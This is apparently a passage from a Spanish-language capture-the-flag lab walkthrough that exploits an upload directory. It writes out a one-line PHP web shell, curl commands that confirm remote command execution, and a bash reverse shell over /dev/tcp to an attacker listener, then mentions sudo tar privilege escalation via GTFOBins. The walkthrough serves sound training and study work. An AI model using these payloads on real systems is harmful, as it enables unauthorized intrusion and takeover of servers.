3. Explotación Web (RCE)

Tras descubrir que la ruta /uploads/ permite la ejecución de código (Directory Listing y ejecución PHP), el objetivo es lograr Ejecución Remota de Comandos (RCE). Aquí documentamos la creación del payload, la verificación mediante `curl` y la estabilización vital de la consola (TTY) tras recibir la reverse shell.

# Creamos una web shell simple y la subimos al servidor:

echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Validamos la ejecución remota de comandos comprobando nuestro usuario:

$ curl "http://10.88.0.2/uploads/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# En la Terminal 2 (Listener), ponemos el puerto en escucha:

sudo nc -lvnp 443

# En la Terminal 3, inyectamos el comando 'bash' reverse (Curl de Oro):

curl "http://10.88.0.2/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.88.0.1/443%200%3E%261'"

# Una vez recibida la conexión, la shell es inestable. Aplicamos el tratamiento de la TTY:

www-data@60393dfbd77e:/$ script /dev/null -c bash

5. Compromiso Total (Root)

Con acceso como el usuario bob, verificamos sus permisos en el sistema operativo. El descubrimiento de la capacidad para ejecutar el binario tar como superusuario (Sudo) sin contraseña nos otorga el vector final. Interactúa con el terminal inferior para ejecutar el exploit (GTFOBins) y capturar la flag final.
